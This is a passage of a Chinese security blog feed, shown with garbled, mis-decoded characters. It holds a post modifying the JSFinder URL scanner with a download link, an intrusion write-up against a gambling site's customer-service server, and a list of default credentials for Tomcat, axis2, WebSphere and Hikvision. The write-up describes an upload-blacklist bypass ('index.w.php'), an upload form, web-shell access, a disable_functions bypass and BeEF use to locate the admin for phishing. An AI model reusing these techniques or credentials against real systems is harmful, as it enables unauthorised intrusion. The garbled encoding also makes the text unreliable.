è¿™ä¸ªä¸œè¥¿ï¼Ÿ"><a href="#1-ä¸ºä»€ä¹ˆè¦æ”¹é€ è¿™ä¸ªä¸œè¥¿ï¼Ÿ" class="headerlink" title="1.ä¸ºä»€ä¹ˆè¦æ”¹é€ è¿™ä¸ªä¸œè¥¿ï¼Ÿ"></a>1.ä¸ºä»€ä¹ˆè¦æ”¹é€ è¿™ä¸ªä¸œè¥¿ï¼Ÿ</h2><p>å› ä¸ºæˆ‘ç»å¸¸ä½¿ç”¨è¿™æ¬¾å·¥å…·ï¼Œæˆ‘å‘ç°äº†å¾ˆå¤šä¸è¶³ä¹‹å¤„ï¼Œæ¯”å¦‚è¯´ï¼Œå¦‚æœçˆ¬å–ä¸€ä¸ªå¤§å‹ä¸€ç‚¹çš„ï¼Œä¼šå‘ç°å¾ˆå¤šurlï¼Œæ¥å£ï¼Œä½†æ˜¯å¤§å¤šæ•°éƒ½æ˜¯404ï¼Œæ²¡æœ‰ç”¨å¤„çš„ï¼Œå°±æ˜¯é€šè¿‡äººå·¥å»ç­›é€‰å°±å¾—è´¹å¥½é•¿ä¸€æ®µæ—¶é—´ï¼Œæˆ‘æœ‰ä¸€æ¬¡çˆ¬ä¸‹æ¥äº†1200å¤šæ¡ï¼Œå¯†å¯†éº»éº»â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.</p><p>æ‰€æœ‰æˆ‘çš„è®¾æƒ³æ˜¯å¯ä»¥å¢åŠ ä¸€ä¸ªéªŒè¯æ¨¡å—ï¼Œè¿›è¡Œç®€å•çš„éªŒè¯ï¼Œæ‰”æ‰é‚£äº›ä¸å­˜åœ¨çš„urlé“¾æ¥ï¼Œå‡å°‘äººå·¥çš„ç­›é€‰ã€‚</p><h2 id="2-æ‰¾åˆ°æºç ä¸€é¡¿æ”¹ï¼ˆéªŒè¯æ¨¡å—ï¼‰"><a href="#2-æ‰¾åˆ°æºç ä¸€é¡¿æ”¹ï¼ˆéªŒè¯æ¨¡å—ï¼‰" class="headerlink" title="2.æ‰¾åˆ°æºç ä¸€é¡¿æ”¹ï¼ˆéªŒè¯æ¨¡å—ï¼‰"></a>2.æ‰¾åˆ°æºç ä¸€é¡¿æ”¹ï¼ˆéªŒè¯æ¨¡å—ï¼‰</h2><p>æ”¹æºç ä¸€å®šè¦æ‰¾åˆ°å…³é”®ç‚¹æ”¹ï¼Œæˆ‘è¿™é‡Œç›´æ¥åœ¨å®ƒè¿›è¡Œæ•°æ®å¤„ç†çš„æ—¶å€™åŠ å…¥æˆ‘æƒ³è¦çš„ä¸œè¥¿ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">thread_num &#x3D; 0</span><br><span class="line">info &#x3D; &#39;è®¿é—®æˆåŠŸ&#39;</span><br><span class="line">lock &#x3D; threading.Lock()</span><br><span class="line">if urls &#x3D;&#x3D; None:</span><br><span class="line">  return None</span><br><span class="line">find_url_all_num &#x3D; len(urls)</span><br><span class="line">content_url &#x3D; &quot;&quot;</span><br><span class="line">content_subdomain &#x3D; &quot;&quot;</span><br><span class="line">if self.args.verify !&#x3D;0:</span><br><span class="line">  print(&quot;A total of Find &quot; + str(len(urls)) + &quot; URL:\n&quot;)</span><br><span class="line">  print(&quot;-----------------------But further validation is needed-----------------!\n\n\n&quot;)</span><br><span class="line">  domian_text &#x3D; requests.get(domian,verify &#x3D;False).text</span><br><span class="line">  print(&quot;The length of the page currently visited &#x3D;&gt;&quot;+str(len(domian_text)))</span><br><span class="line">  result &#x3D;&#123;&#125;</span><br><span class="line">  for url in urls:</span><br><span class="line">    thread_num +&#x3D; 1</span><br><span class="line">    self.therads_op(url, content_url, lock,thread_num,result)</span><br><span class="line">    if thread_num &#x3D;&#x3D; 100:</span><br><span class="line">      time.sleep(1)</span><br><span class="line">  find_url_success_num &#x3D; 0</span><br><span class="line">  for length,url_list in result.items():</span><br><span class="line">    print(&quot;-----------------------The return packet length is :&#123;len&#125;------------------------&quot;.format(len &#x3D;length))</span><br><span class="line">    for url in url_list:</span><br><span class="line">      print(url+&quot;\n&quot;)</span><br><span class="line">      find_url_success_num +&#x3D; 1</span><br><span class="line">      content_url+&#x3D;url+&quot;\n&quot;</span><br></pre></td></tr></table></figure><p>å…³é”®çš„ä¸€äº›ä»£ç ï¼Œè¿™é‡Œå› ä¸ºä½¿ç”¨äº†ç½‘ç»œéªŒè¯ï¼Œæ‰€ä»¥å†™äº†ä¸ªå¤šçº¿ç¨‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def therads_op(self,url,content_url,lock,thread_num,result):</span><br><span class="line">    threading.Thread(target&#x3D;self.request(url,content_url,lock,result),args&#x3D;(url,content_url,lock,result,))</span><br><span class="line">    if lock.acquire():</span><br><span class="line">      thread_num -&#x3D; 1</span><br><span class="line">    lock.release()</span><br></pre></td></tr></table></figure><p>éªŒè¯æ¨¡å—ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">def request(self,url,content_url,lock,result):</span><br><span class="line">   headers &#x3D; &#123;</span><br><span class="line">      &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit&#x2F;534.50 (KHTML, like Gecko) Version&#x2F;5.1 Safari&#x2F;534.50&quot;,</span><br><span class="line">   &#125;</span><br><span class="line">   try:</span><br><span class="line">      resp &#x3D; requests.get(url,verify &#x3D; False,timeout &#x3D; 10,headers&#x3D;headers)</span><br><span class="line">      if resp.status_code !&#x3D; 404 and lock.acquire():</span><br><span class="line">         content_url +&#x3D; url + &quot;\n&quot;</span><br><span class="line">         if result.get(str(len(resp.text)), 0) &#x3D;&#x3D; 0:</span><br><span class="line">            result[str(len(resp.text))] &#x3D; []</span><br><span class="line">            result[str(len(resp.text))].append(url)</span><br><span class="line">         else:</span><br><span class="line">            result[str(len(resp.text))].append(url)</span><br><span class="line">         lock.release()</span><br><span class="line"></span><br><span class="line">   except Exception as e:</span><br><span class="line">      pass</span><br><span class="line">   finally:</span><br><span class="line">      try:</span><br><span class="line">         lock.release()</span><br><span class="line">      except RuntimeError as e:</span><br><span class="line">         pass</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘æ˜¯ç›´æ¥åˆ¤æ–­å®ƒè¿”å›å€¼æ˜¯ä¸æ˜¯404ï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥åŠ å…¥ä½ è‡ªå·±çš„åˆ¤æ–­æ¡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘çš„æºç é‡Œï¼Œæœ‰è®¡æ•°è¿”å›åŒ…çš„é•¿åº¦ï¼Œå› ä¸ºæˆ‘å‘ç°å¾ˆå¤šåŒ…çš„è¿”å›åŒ…éƒ½æ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥æˆ‘è¿™é‡Œåˆ¤æ–­é•¿åº¦ï¼Œè¿›è¡Œå½’ç±»ï¼Œæœ‰åˆ©äºæˆ‘ä»¬è‡ªå·±äººå·¥ç­›é€‰ï¼Œæˆ‘ä»¬åªéœ€è¦å¾—åˆ°ä»»æ„é•¿åº¦çš„ä¸€ä¸ªurlè¿”å›åŒ…ï¼Œå°±å¯ä»¥çŸ¥é“å…¶ä»–æœ‰ç€ç›¸åŒé•¿åº¦çš„urlè¿”å›çš„å†…å®¹ï¼ˆè¿™å°±æ˜¯æˆ‘å½“æ—¶çš„æƒ³æ³•å§ï¼‰</p><h2 id="3-æ‰¾åˆ°æºç ä¸€é˜µæ”¹ï¼ˆè¾“å‡ºæ•°æ®æ ¼å¼ï¼‰"><a href="#3-æ‰¾åˆ°æºç ä¸€é˜µæ”¹ï¼ˆè¾“å‡ºæ•°æ®æ ¼å¼ï¼‰" class="headerlink" title="3.æ‰¾åˆ°æºç ä¸€é˜µæ”¹ï¼ˆè¾“å‡ºæ•°æ®æ ¼å¼ï¼‰"></a>3.æ‰¾åˆ°æºç ä¸€é˜µæ”¹ï¼ˆè¾“å‡ºæ•°æ®æ ¼å¼ï¼‰</h2><p>å› ä¸ºåŸå·¥å…·æ˜¯æœ‰æŠŠè¾“å‡ºç»“æœè¾“å‡ºåˆ°ä¸€ä¸ªæ–‡ä»¶çš„åŠŸèƒ½ï¼Œä½†æ˜¯æˆ‘æ„Ÿè§‰ä¸å¤Ÿç›´è§‚ï¼Œæ‰€ä»¥æˆ‘æŠŠè¾“å‡ºç»“æœè½¬æ¢æˆäº†htmlæ–‡ä»¶ï¼Œå¯ä»¥ç›´æ¥ç‚¹å‡»urlï¼Œè¿›è¡Œè®¿é—®ï¼Œæ–¹ä¾¿äº†å¾ˆå¤šã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">if self.args.output_html !&#x3D;None:</span><br><span class="line">   table_tr0 &#x3D; &#39;&#39;</span><br><span class="line">   html &#x3D; html_Template()</span><br><span class="line">   total_str &#x3D; &#39;å…±url: %sï¼Œè®¿é—®æˆåŠŸï¼š%sï¼Œå¤±è´¥ %s&#39; % (find_url_all_num, find_url_success_num, find_url_all_num-find_url_success_num)</span><br><span class="line">   if self.args.verify !&#x3D;0:</span><br><span class="line">      for length,url_list in result.items():</span><br><span class="line">         for url in url_list:</span><br><span class="line">            url_a &#x3D; &quot;&lt;a href&#x3D;&#123;url&#125;&gt;ç‚¹å‡»&lt;&#x2F;a&gt;&quot;.format(url&#x3D;url)</span><br><span class="line">            table_td &#x3D; html.TABLE_TMPL % dict(length&#x3D;length, url&#x3D;url, result&#x3D;info,</span><br><span class="line">                                      ask_url&#x3D;url_a, )</span><br><span class="line">            table_tr0 +&#x3D; table_td</span><br><span class="line">   else:</span><br><span class="line">      for url in urls:</span><br><span class="line">         url_a &#x3D; &quot;&lt;a href&#x3D;&#123;url&#125;&gt;ç‚¹å‡»&lt;&#x2F;a&gt;&quot;.format(url&#x3D;url)</span><br><span class="line">         table_td &#x3D; html.TABLE_TMPL % dict(length&#x3D;&quot;æ— æ³•è·å–&quot;, url&#x3D;url, result&#x3D;info,</span><br><span class="line">                                   ask_url&#x3D;url_a, )</span><br><span class="line">         table_tr0 +&#x3D; table_td</span><br><span class="line">   output &#x3D; html.HTML_TMPL % dict(domain&#x3D;self.args.url,value&#x3D;total_str, table_tr&#x3D;table_tr0, )</span><br><span class="line">   # ç”ŸæˆhtmlæŠ¥å‘Š</span><br><span class="line">   filename &#x3D; &#39;&#123;date&#125;_&#123;url&#125;.html&#39;.format(date&#x3D;time.strftime(&#39;%Y%m%d%H%M%S&#39;),url &#x3D; self.args.output_html)</span><br><span class="line">   dir &#x3D; str(os.getcwd())</span><br><span class="line">   filename &#x3D; os.path.join(dir, filename)</span><br><span class="line">   with open(filename, &#39;wb&#39;) as f:</span><br><span class="line">      f.write(bytes(output, &quot;utf-8&quot;))</span><br></pre></td></tr></table></figure><p>æˆ‘æŠŠæºç æ”¹æˆäº†ä¸€ä¸ªç±»çš„å½¢å¼ï¼Œæœ‰åˆ©äºä»¥åçš„åŠ å…¥åˆ°å¤§é¡¹ç›®ä¸­ï¼Œç§¯å°æˆå¤šï¼</p><h2 id="4-æ•ˆæœé¢„è§ˆ"><a href="#4-æ•ˆæœé¢„è§ˆ" class="headerlink" title="4.æ•ˆæœé¢„è§ˆ"></a>4.æ•ˆæœé¢„è§ˆ</h2><p>åœ¨æ²¡æœ‰åŠ éªŒè¯å‚æ•°çš„æƒ…å†µä¸‹:</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2054569634.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/364494591.png"></p><p>å¼€å¯éªŒè¯çš„æƒ…å†µä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2205501301.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1106342449.png"></p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æœ¬æ¥è¿˜æƒ³åŠ ä¸€ä¸ªçˆ¬è™«æ¨¡å—è¿›å»çš„ï¼Œä½†æ˜¯ä½œè€…æœ‰è‡ªå·±çš„çˆ¬è™«æ¨¡å—ï¼Œå°±ç®—äº†ï¼Œå¦‚æœå¯ä»¥çš„è¯ï¼Œä¹Ÿå¯ä»¥æŠŠä¸€äº›ä¼˜ç§€çš„å¼€æºçˆ¬è™«åŠ è¿›å»ï¼Œå°±çœŸçš„å¾ˆniceäº†ï¼Œæˆ‘ä»¥åå†åŠ æŠŠï¼Œå…ˆè¿™æ ·å§ï¼Œè¿è¡Œæœ‰ä»€ä¹ˆé—®é¢˜å¯ä»¥åŠæ—¶è”ç³»æˆ‘ï¼Œè¶Šæ”¹è¶Šå®ç”¨ã€‚<br>æŒºé¦™çš„ï¼çœŸé¦™ï¼Œæ‰¾ä¸ªæœºä¼šæŠŠæºç æ”¾åˆ°githubä¸Šé¢å»ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1132015684.png"></p><p>exeç¨‹åºç™¾åº¦äº‘é“¾æ¥:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;17WIa94fr5EAHgfo4UI6Eyw </span><br><span class="line">æå–ç ï¼šqq0c </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å·¥å…·æ¨é€ </tag>
            
            <tag> JSFinder </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä»ä»£ç å®¡è®¡åˆ°æ‹¿ä¸‹æŸè èœå®¢æœç«™</title>
      <link href="2021/01/09/%E4%BB%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%88%B0%E6%8B%BF%E4%B8%8B%E6%9F%90%E8%8F%A0%E8%8F%9C%E5%AE%A2%E6%9C%8D%E7%AB%99/"/>
      <url>2021/01/09/%E4%BB%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%88%B0%E6%8B%BF%E4%B8%8B%E6%9F%90%E8%8F%A0%E8%8F%9C%E5%AE%A2%E6%9C%8D%E7%AB%99/</url>
      
        <content type="html"><![CDATA[<h2 id="èµ·-å› "><a href="#èµ·-å› " class="headerlink" title="èµ· å› "></a>èµ· å› </h2><p>ç»™çš„ç›®æ ‡åªæœ‰ä¸€ä¸ªåå°ç³»ç»Ÿç™»é™†é¡µé¢ã€‚ä¸Šå»å°±æ˜¯ä¸€ä¸ªå¼±å£ä»¤æ€¼ä»–ï¼Œä½†è¿™ç§è èœç«™åŸºæœ¬ä¸å¯èƒ½ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/974311650.png"></p><p>è¿™æ—¶å€™å°±è¦ä½“ç°ä¿¡æ¯æœé›†çš„é‡è¦æ€§äº†ï¼Œæ¯•ç«Ÿæ¸—é€æœ€é‡è¦çš„å°±æ˜¯ä¿¡æ¯æœé›†ï¼ŒåºŸè¯ä¹Ÿä¸å¤šè¯´ï¼Œè¿™ä¸ªè¿‡ç¨‹æœ‰ç‚¹æ¼«é•¿ï¼Œç›´æ¥ä¸Šä¸»èœå§</p><h2 id="æ­£-æ–‡"><a href="#æ­£-æ–‡" class="headerlink" title="æ­£ æ–‡"></a>æ­£ æ–‡</h2><p>åˆ©ç”¨fofaã€shdanã€å¾®æ­¥ã€è¶…çº§pingè¿›è¡ŒåŸŸåæŸ¥ipï¼Œä»¥åŠipåæŸ¥åŸŸåã€‚å¾—åˆ°å…¶ä¸­ä¸€ä¸ªå®¢æœç«™</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/888658809.png"></p><p>è¯¥ç«™æœ‰å­˜å‚¨å‹xssï¼Œæ‰“è¿›å»åè¿”å›çš„å…¨æ˜¯å®‰å“æ‰‹æœºï¼Œé‚æ”¾å¼ƒã€‚ç›´æ¥å¥—å®¢æœè¯ï¼Œæœ‰ç‚¹ä¹…è¿œè¿™é‡Œå°±æ²¡å¾—å›¾äº†ï¼Œé€šè¿‡å®¢æœç»™å‡ºçš„ä¿¡æ¯ï¼Œç›´æ¥æ‰¹é‡æ‰«cç«¯åŒå®å¡”ç«¯å£ã€‚å†ipåæŸ¥åŸŸåå¾—åˆ°å¦ä¸€å®¢æœç«™</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1688670897.png"></p><p>é€šè¿‡ç›®å½•æ‰«æï¼Œå‘ç°æœ‰install.phpæ–‡ä»¶ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1840589366.png"></p><p>å¥½å®¶ä¼™ï¼Œç›´æ¥å‘Šè¯‰äº†æˆ‘æ˜¯ä»€ä¹ˆå®¢æœç³»ç»Ÿï¼Œgoogleä¸€æœï¼Œå¼€æºçš„ï¼Œç›´æ¥ä¸‹ä¸‹æ¥å®¡è®¡ä¸€æ³¢ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2033182467.png"></p><p>æ”¾å…¥seayè‡ªåŠ¨å®¡è®¡ä¸€æ³¢ï¼Œæ‰“å¼€ä¸€çœ‹ï¼Œç»éªŒå¤šçš„ä¸€çœ‹å°±çŸ¥é“æ˜¯thinkphpæ¡†æ¶ã€‚æ ¹æ®å®‰è£…æ•™ç¨‹ï¼Œå¾—çŸ¥æ­¤ç³»ç»Ÿéœ€è¦ç»‘å®šåˆ°publicç›®å½•ï¼Œæ ¹æ®thinkphpçš„è·¯ç”±è§„åˆ™ï¼Œwebèƒ½è®¿é—®åˆ°çš„ç›®å½•åªæœ‰applicationäº†ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/60637078.png"></p><p>å®¡è®¡è¿‡ç¨‹æœ‰ç‚¹æ¼«é•¿ï¼Œæ­¤å¤„çœç•¥ã€‚ç›´æ¥ä¸Šæ‰¾åˆ°çš„æ¼æ´å‡½æ•°ã€‚é€šè¿‡å…¨å±€æœç´¢uploadï¼Œå‘ç°è¯¥å‡½æ•°å­˜åœ¨ä¸€ä¸ªé»‘åå•è¿‡æ»¤ã€‚è¯¥å‡½æ•°ä»¥æ–‡ä»¶åä¸­çš„ç‚¹æ¥åˆ†å‰²åå­—å¹¶å­˜å…¥æ•°ç»„ä¸­ï¼Œä¸”ä»¥æ•°ç»„çš„ç¬¬äºŒä¸ªä¸ºåç¼€ã€‚å³å½“æ–‡ä»¶åä¸ºindex.phpæ—¶ï¼Œ$ext=phpï¼Œä½†phpåœ¨é»‘åå•ä¸­;æ­¤æ—¶æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªindex.w.phpæ–‡ä»¶ï¼Œ$ext=wï¼Œä»¥æ­¤æ¥ç»•è¿‡é»‘åå•</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4038675987.png"></p><p>æ ¹æ®thinkphpçš„è·¯ç”±è§„åˆ™ï¼Œè¯¥å‡½æ•°ä½äº<code>application/admin/controller/Event.php</code>æ–‡ä»¶ä¸­ï¼Œå¯¹åº”çš„webè·¯å¾„ä¸º<code>/admin/event/uploadimg</code></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4162863277.png"></p><p>æˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ªæœ¬åœ°çš„æ–‡ä»¶ä¸Šä¼ ï¼Œå¹¶ç”¨burpæŠ“åŒ…poståˆ°è¯¥è·¯å¾„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;domain.doamin&#x2F;admin&#x2F;event&#x2F;uploadimg&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;label for&#x3D;&quot;file&quot;&gt;Filename:&lt;&#x2F;label&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;editormd-image-file&quot; id&#x3D;&quot;editormd-image-file&quot;&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/486829852.png"></p><p>å¯ä»¥çœ‹åˆ°æˆåŠŸä¸Šä¼ è¿‡å»ï¼Œæ­¤æ—¶ç”¨èšå‰‘è¿æ¥ï¼ŒæˆåŠŸgetshellã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1624874699.png"></p><p>è¿›å»ä¸€çœ‹ï¼Œå¥½å®¶ä¼™ï¼Œä¸€å †ç«™ç‚¹ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4096885800.png"></p><p>å»æ‰§è¡Œå‘½ä»¤æ˜¯å‘ç°è¾“å…¥ä»€ä¹ˆéƒ½è¿”å›ret=127,åé¢æƒ³èµ·æ¥å®å¡”çš„ç«™åŸºæœ¬éƒ½ç¦ç”¨äº†å¾ˆå¤šå‡½æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/951336023.png"></p><p>è¿™é‡Œæˆ‘ä»¬ç›´æ¥å¯ä»¥ç”¨èšå‰‘çš„disable_functionsæ’ä»¶ç»•è¿‡æ‰§è¡Œå‘½ä»¤é™åˆ¶</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2472236437.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/862372783.png"></p><h2 id="å-ç»­"><a href="#å-ç»­" class="headerlink" title="å ç»­"></a>å ç»­</h2><p>å› ä¸ºè¯¥æœºå­ä¸ºvpsï¼Œå†…ç½‘ä¸æ‰“ï¼Œç›´æ¥ä¸Šäº†beefå»æ¢æµ‹ç®¡ç†å‘˜çš„çœŸå®ipï¼Œä¸ºä¹‹åçš„é’“é±¼åšå‡†å¤‡ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¼±å£ä»¤ï¼Œyyds</title>
      <link href="2021/01/08/%E5%BC%B1%E5%8F%A3%E4%BB%A4%EF%BC%8Cyyds/"/>
      <url>2021/01/08/%E5%BC%B1%E5%8F%A3%E4%BB%A4%EF%BC%8Cyyds/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€äº›è‡ªå·±æœé›†çš„å¼±å£ä»¤"><a href="#ä¸€äº›è‡ªå·±æœé›†çš„å¼±å£ä»¤" class="headerlink" title="ä¸€äº›è‡ªå·±æœé›†çš„å¼±å£ä»¤"></a>ä¸€äº›è‡ªå·±æœé›†çš„å¼±å£ä»¤</h2><p>åœ¨æ¸—é€ä¼ä¸šèµ„äº§æ—¶ï¼Œå¼±å£ä»¤å¾€å¾€å¯è¾¾åˆ°å‡ºå¥‡åˆ¶èƒœï¼Œäº‹åŠåŠŸå€çš„æ•ˆæœï¼ç‰¹åˆ«æ˜¯å†…ç½‘ï¼Œé‚£å®¶ä¼™ï¼Œä¸€ä¸ªadmin adminæˆ–è€…admin123 æ‹¿ä¸‹ä¸€ç‰‡ï¼Œæ‡‚çš„éƒ½æ‡‚ã€‚</p><p>å½“ä½ è¿˜åœ¨è‹¦æ¼å¦‚ä½•ä¸‹æ‰‹æ—¶ï¼Œæˆ‘å´æ‚„æ‚„è¿›äº†åå°ï¼Œgetshelläº†</p><p>ä»¥ä¸‹æ˜¯æˆ‘å®æˆ˜ä¸­ï¼Œç»å¸¸é‡åˆ°çš„ä¸€äº›å£ä»¤ï¼Œå¸Œæœ›å¤§å®¶è®°å¥½ç¬”è®°ï¼Œå¼±å£æ°¸è¿œçš„0Dayï¼Œæ–‡æœ«æœ‰å¸¸ç”¨å­—å…¸ï¼Œå’ŒæŸ¥è¯¢ç½‘ç«™ã€‚</p><hr><h3 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h3><p>é‡æ‰€å‘¨çŸ¥ï¼Œtomcatæœ‰é¡¹ç›®éƒ¨ç½²ç®¡ç†ç•Œé¢</p><p><a href="http://ip/">http://ip</a>:8080/host-manager/html</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1478672069.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ç”¨æˆ·åï¼šadmin  å¯†ç ï¼šadmin</span><br><span class="line">ç”¨æˆ·åï¼štomcat å¯†ç ï¼štomcat</span><br><span class="line">ç”¨æˆ·åï¼štomcat å¯†ç ï¼šs3cret</span><br></pre></td></tr></table></figure><h3 id="Apache-axis2"><a href="#Apache-axis2" class="headerlink" title="Apache axis2"></a>Apache axis2</h3><p>axis2åŒæ ·å’Œtomcatæœ‰webæ§åˆ¶å°</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/304239293.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç”¨æˆ·åï¼šadmin   å¯†ç ï¼šaxis2</span><br></pre></td></tr></table></figure><h3 id="websphere"><a href="#websphere" class="headerlink" title="websphere"></a>websphere</h3><p>è¿™ä¸ªå¾ˆå°‘è§ï¼Œä¸è¿‡è¿˜æ˜¯è¢«æˆ‘è§åˆ°äº†<br>9080ç«¯å£</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2966209192.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">system&#x2F;manager</span><br><span class="line">wasadmin&#x2F;wasadmin</span><br><span class="line">admin&#x2F;admin</span><br></pre></td></tr></table></figure><h3 id="MapZone-Server-Login"><a href="#MapZone-Server-Login" class="headerlink" title="MapZone Server Login"></a>MapZone Server Login</h3><p>MAPZONE Server æ˜¯å…¬å¸è‡ªä¸»å¼€å‘çš„ä¸€å¥—æœåŠ¡å‹GIS å¹³å°äº§å“,äº§å“åŸºäºé¢å‘æœåŠ¡æ¶æ„,æä¾›æ•°æ®æœåŠ¡å‘å¸ƒã€åŠŸèƒ½æœåŠ¡å‘å¸ƒã€å¤–éƒ¨æœåŠ¡èšåˆã€å®šåˆ¶åŒ–æœåŠ¡ç­‰åŠŸèƒ½</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3812486853.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MapZone&#x2F;MapZone</span><br></pre></td></tr></table></figure><h3 id="HIKVISION"><a href="#HIKVISION" class="headerlink" title="HIKVISION"></a>HIKVISION</h3><p>seseå‘æŠ–çš„æ‘„(se)åƒå¤´<br>HIKVISIONé»˜è®¤å¯†ç 12345ï¼Œä½†æ˜¯å®‰è£…çš„æ—¶å€™éƒ½ä¼šæç¤ºæ›´æ”¹é»˜è®¤å¯†ç 